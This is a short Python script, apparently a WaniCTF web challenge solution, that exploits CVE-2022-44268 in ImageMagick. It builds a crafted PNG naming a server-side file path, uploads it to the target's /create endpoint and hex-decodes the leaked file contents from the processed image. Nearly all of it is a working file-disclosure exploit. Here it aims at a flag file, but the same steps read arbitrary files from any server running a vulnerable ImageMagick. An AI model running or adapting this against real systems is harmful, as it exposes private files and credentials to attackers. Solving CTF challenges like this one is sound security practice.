import os
import tempfile
import subprocess
import requests
import re

# https://github.com/voidz0r/CVE-2022-44268/tree/ba488a8916d900aef92fd52360f83ad3426d2d71 を x86_64-unknown-linux-gnu 向けにコンパイルしたもの
poc_executable_path = os.path.join(os.path.dirname(__file__), "cve-2022-44268")

# https://github.com/ImageMagick/ImageMagick/releases/tag/7.1.1-4
magick_executable_path = os.path.join(
    os.path.dirname(__file__), "ImageMagick--gcc-x86_64.AppImage"
)


def create_payload_png(leak_path):
    with tempfile.TemporaryDirectory() as d:
        subprocess.run(
            [poc_executable_path, leak_path],
            cwd=d,
            check=True,
            timeout=5,
        )
        with open(f"{d}/image.png", "rb") as f:
            return f.read()


def extract(image_data):
    res = subprocess.run(
        [magick_executable_path, "identify", "-verbose", "-"],
        input=image_data,
        stdout=subprocess.PIPE,
        check=True,
        timeout=5,
    )
    stdout = res.stdout.decode()

    match = re.search(r"Raw profile type: \n\n *\d+\n([a-f\d\n]+)", stdout)
    if match is None:
        match = re.search(
            r"Raw profile type txt: \ntxt\n *\d+\n([a-f\d\n]+)",
            stdout,
        )
    if match is None:
        return None

    return bytes.fromhex(match.group(1).replace("\n", ""))


def web_certified1(origin):
    # Fetch /flag-A.txt
    payload = create_payload_png("/flag_A")
    res = requests.post(
        f"{origin}/create",
        files={"file": ("payload.png", payload)},
        timeout=3,
    )

    print(extract(res.content))


if __name__ == "__main__":
    web_certified1("https://certified-web.wanictf.org")
